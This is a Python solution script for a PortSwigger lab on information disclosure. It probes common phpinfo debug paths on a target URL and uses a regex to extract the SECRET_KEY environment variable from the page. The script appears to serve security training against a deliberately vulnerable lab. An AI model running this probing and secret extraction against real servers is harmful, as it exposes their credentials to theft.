# Lab 02 — Information disclosure on debug page
# PortSwigger: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page
#
# Vulnerability: A phpinfo() debug page is accessible and discloses the
#                full server environment, including a SECRET_KEY variable
# Aim:           Obtain the SECRET_KEY environment variable
#
# Technique:
#   The home page's source references a debug page (commonly at
#   /cgi-bin/phpinfo.php). Fetch it directly and extract SECRET_KEY from
#   the environment variables table it dumps.
#
# Usage: python information_disclosure_lab02.py <url>

import sys
import re
import urllib3
from proxies import proxies
from information_disclosure_utils import banner, section, make_session, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEBUG_PAGE_CANDIDATES = [
    "/cgi-bin/phpinfo.php",
    "/phpinfo.php",
    "/debug/phpinfo.php",
    "/info.php",
]

if __name__ == "__main__":
    banner()
    section("LAB 02 — INFORMATION DISCLOSURE ON DEBUG PAGE")

    if len(sys.argv) != 2:
        print("  Usage: python information_disclosure_lab02.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: check the home page source for a link to the debug page ────
    print("  ── Step 1: scan home page source for a debug page reference\n")
    home = session.get(url)
    link_match = re.search(r'href=["\']([^"\']*phpinfo[^"\']*)["\']', home.text, re.IGNORECASE)

    debug_path = link_match.group(1) if link_match else None
    if debug_path:
        print(f"  ✔  Found debug page link in source: {debug_path}\n")
        candidates = [debug_path] + DEBUG_PAGE_CANDIDATES
    else:
        print("  ?  No direct link found — trying common debug page paths\n")
        candidates = DEBUG_PAGE_CANDIDATES

    # ── Step 2: fetch the debug page ─────────────────────────────────────────
    print("  ── Step 2: fetch the debug page\n")
    debug_response = None
    for path in candidates:
        full_path = path if path.startswith("/") else f"/{path}"
        r = session.get(f"{url}{full_path}")
        marker = "✔" if r.status_code == 200 else "✘"
        print(f"  {marker}  [{r.status_code}] {full_path}")
        if r.status_code == 200 and "phpinfo" in r.text.lower():
            debug_response = r
            break

    if not debug_response:
        print("\n  ✘  Could not locate an accessible phpinfo page automatically.")
        sys.exit(1)

    # ── Step 3: extract SECRET_KEY ────────────────────────────────────────────
    print("\n  ── Step 3: extract SECRET_KEY from the environment dump\n")
    secret_match = re.search(
        r'SECRET_KEY</td>\s*<td[^>]*>([^<]+)</td>',
        debug_response.text, re.IGNORECASE
    )
    if not secret_match:
        secret_match = re.search(r'SECRET_KEY[^A-Za-z0-9]{1,20}([A-Za-z0-9_\-]{10,})', debug_response.text)

    if secret_match:
        print_box("SECRET_KEY", secret_match.group(1).strip())
    else:
        print("  ?  Could not auto-extract SECRET_KEY — inspect the phpinfo")
        print("     output manually (Ctrl+F for 'SECRET_KEY' in the page).")
